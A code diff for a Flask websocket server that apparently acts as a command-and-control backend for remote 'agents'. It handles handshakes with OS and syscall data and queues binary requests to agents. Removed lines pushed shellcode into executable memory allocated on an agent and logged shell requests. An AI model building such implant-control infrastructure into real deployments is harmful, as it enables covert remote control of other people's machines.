@@ -6,7 +6,8 @@ from app import anon_bp
 from flask_jwt_extended.exceptions import JWTExtendedException
 from routes.auth.sudo.system import sock
 from models.agent import Agent
-from models.line import Line
+from models.request import Request
+from models.response import Response
 from models.syscall import Syscall
 from services.binary import push_syscall, allocmem
 import logging
@@ -19,10 +20,13 @@ from flask import request, current_app
 import threading
 import time
 
-
+def split_three(data: bytes | bytearray):
+    first = data[:8]
+    second = data[8:16]
+    rest = data[16:]
+    return first, second, rest
 
 def parse_handshake(msg, agent_id):
-    ip = request.remote_addr
     if msg is None:
         raise ValueError("empty handshake")
 
@@ -34,69 +38,55 @@ def parse_handshake(msg, agent_id):
         raise TypeError(f"unexpected handshake type: {type(msg)!r}")
 
     msg = bytes(msg)
-    parts = msg.split(b';')
-    os_bytes = parts[0]
-    scratchpad = parts[1]
-    syscall_blob = parts[2]
-    agent = Agent.by_id(agent_id)
-    os_name = os_bytes.decode("utf-8", errors="replace")
-    agent.os = os_name
-    agent.scratchpad = scratchpad
-    agent.save()
-    print(f"New agent os = {os_name}, scratchpad = {scratchpad}")
-    Syscall.save_syscalls_bytes(agent.id, syscall_blob)
+    os_bytes, scratchpad, syscall_blob = split_three(msg)
+    db_session, agent = Agent.by_id_lock(agent_id)
+    agent.os = struct.unpack("<Q",os_bytes)[0]
+    agent.scratchpad = struct.unpack("<Q",scratchpad)[0]
+    print(f"New agent os = {hex(struct.unpack("<Q",os_bytes)[0])} {len(os_bytes)}, scratchpad = {hex(struct.unpack("<Q",scratchpad)[0])} {len(scratchpad)}")
+    Syscall.save_syscalls_bytes(agent.id, syscall_blob, db_session)
+    db_session.commit()
+    db_session.remove()
 
-def handle_msg_type(msg, agent_id):
-    if not msg:
-        return
-
+def handle_msg_type(request_id):
+    request_obj = None
+    while True:
+        print("Checking...")
+        db_session, request_obj = Request.by_id_lock(request_id)
+        if request_obj is None:
+            break
+        if request_obj.response != None:
+            break
+        db_session.remove()
+        time.sleep(1)
+    msg = request_obj.response
     msg_type = msg[0]
     payload = msg[1:]
 
     if msg_type == 0x00:
         # handshake
-        parse_handshake(msg, agent_id)
-        retparams, shellcode = allocmem(agent_id, 0x1000, 0x40)
-        to_send = bytearray()
-        to_send.extend(b'\x00')
-        print(len(shellcode))
-        to_send.extend(struct.pack('<Q', int(len(shellcode))))
-        to_send.extend(shellcode)
-        for retparam in retparams:
-            to_send.extend(struct.pack('<Q', retparam))
-        print(to_send.hex())
-        line = Line.create_for_agent(
-            agent_id=agent_id,
-            content=to_send,
-            incoming=False
-        )
-        line.save()
-
-
-        
-
-    elif msg_type == 0x01:
-        # returned message
-        line = Line.create_for_agent(
-            agent_id=agent_id,
-            content=payload,
-            incoming=True
-        )
-        line.save()
-
+        parse_handshake(payload, request_obj.agent_id)
     else:
-        # unknown message type
-        line = Line.create_for_agent(
-            agent_id=agent_id,
-            content=f"[unknown msg type 0x{msg_type:02x}] {payload!r}",
-            incoming=True
-        )
-        line.save()
+        print(f"Unknown message type {msg_type}")
 
+def create_handshake(agent_id):
+    to_send = bytearray()
+    to_send.extend(b'\x00')
+    request_obj = Request(agent_id, to_send)
+    print(f"Request id = {request_obj.id}")
+    handle_msg_type(request_obj.id)
 
 @sock.route(f"{anon_bp.url_prefix}{bp.url_prefix}/ws/<agent_id>")
 def server_agent_ws(ws, agent_id):
-    print(f"Requesting shell for agent {agent_id}...")
+    import threading
+    import time
+
+    from flask import current_app
+    from models.agent import Agent
+    from models.request import Request
+    from models.db import get_session
+
+    print(f"Starting websocket for agent {agent_id}...")
+
     agent = Agent.by_id(agent_id)
     if agent is None:
         agent = Agent(agent_id, "admin")
@@ -104,50 +94,99 @@ def server_agent_ws(ws, agent_id):
 
     app = current_app._get_current_object()
     stop_event = threading.Event()
+    last_request_id = None
 
-    def poll_outgoing():
-        last_sent_id = 0
+    def normalize_to_bytes(data):
+        if isinstance(data, str):
+            return data.encode("utf-8")
+        if isinstance(data, bytearray):
+            return bytes(data)
+        return data
+
+    def mark_request_sent(request_id):
+        db_session, req = Request.by_id_lock(request_id)
+        print(f"Marking as sent {req}")
+
+        req.sent = True
+        db_session.commit()
+        db_session.remove()
+
+    def save_request_response(request_id, message):
+        print(f"Saving response {request_id}")
+        db_session, req = Request.by_id_lock(request_id)
+        print(f"Saving response {req}")
+
+        req.response = message
+        db_session.commit()
+        db_session.remove()
+        return True
+
+    def poll_requests():
+        nonlocal last_request_id
 
         with app.app_context():
             while not stop_event.is_set():
                 try:
-                    lines = Line.by_agent_outgoing_after(agent_id, last_sent_id)
+                    request_obj = Request.by_agent(agent_id)
+                    print(f"Got a request {request_obj}")
 
-                    for line in lines:
-                        last_sent_id = line.id
+                    if request_obj is None:
+                        time.sleep(1)
+                        continue
 
-                        # Expect binary content in DB/model.
-                        data = line.content
-                        if isinstance(data, str):
-                            data = data.encode("utf-8")
-                        elif isinstance(data, bytearray):
-                            data = bytes(data)
+                    request_id = request_obj.id
 
-                        print(
-                            f"Sending to agent {agent_id}: "
-                            f"{len(data)} bytes"
-                        )
+                    if last_request_id == request_id:
+                        time.sleep(1)
+                        continue
 
-                        try:
-                            ws.send(data)
-                        except Exception:
+                    if request_obj.sent is True:
+                        time.sleep(1)
+                        continue
+
+                    data = normalize_to_bytes(request_obj.content)
+                    if not isinstance(data, bytes) or not data:
+                        time.sleep(1)
+                        continue
+
+                    print(f"Sending request {request_id} to agent {agent_id}: {len(data)} bytes")
+
+                    try:
+                        ws.send(data)
+                        last_request_id = request_id
+                        
+
+                        if not mark_request_sent(request_id):
                             stop_event.set()
                             break
+
+                    except Exception:
+                        logger.exception(
+                            "Failed sending request %s to agent %s",
+                            request_id,
+                            agent_id,
+                        )
+                        stop_event.set()
+                        break
 
                     time.sleep(1)
 
                 except Exception:
-                    logger.exception("Failed polling outgoing lines for agent %s", agent_id)
+                    logger.exception("Polling request failed for agent %s", agent_id)
                     stop_event.set()
 
-    poll_thread = threading.Thread(target=poll_outgoing, daemon=True)
-    poll_thread.start()
+    threading.Thread(target=poll_requests, daemon=True).start()
+    threading.Thread(target=create_handshake, args=(agent_id,), daemon=True).start()
 
     try:
         while not stop_event.is_set():
             try:
+                logger.info(
+                    "Polling for responses for agent %s and request %s",
+                    agent.id,
+                    last_request_id,
+                )
                 message = ws.receive()
-                print(f"Received message {message}")
             except Exception:
                 logger.info("WebSocket receive failed/closed for agent %s", agent.id)
                 break
@@ -156,33 +195,30 @@ def server_agent_ws(ws, agent_id):
                 logger.info("WebSocket closed for agent %s", agent.id)
                 break
 
-            # Normalize everything to bytes
-            if isinstance(message, str):
-                message = message.encode("utf-8")
-            elif isinstance(message, bytearray):
-                message = bytes(message)
+            message = normalize_to_bytes(message)
 
-            if not isinstance(message, bytes):
-                logger.warning(
-                    "Unexpected websocket message type for agent %s: %r",
-                    agent.id,
-                    type(message),
-                )
+            if not isinstance(message, bytes) or not message:
                 continue
 
-            if not message:
+            print(f"Received from agent {agent_id}: {len(message)} bytes putting it in request {last_request_id}")
+
+            current_request_id = last_request_id
+            if current_request_id is None:
+                logger.warning("Received response from agent %s but no pending request id", agent_id)
                 continue
 
             with app.app_context():
-                print(
-                    f"Received from agent {agent_id}: "
-                    f"{len(message)} bytes"
-                )
-                handle_msg_type(message, agent.id)
+                save_request_response(current_request_id, message)
+
     finally:
         stop_event.set()
         if agent is not None:
-            agent.online = False
+            try:
+                agent.online = False
+                agent.save()
+            except Exception:
+                logger.exception("Failed updating agent %s offline state", agent_id)
+
         try:
             ws.close()
         except Exception:
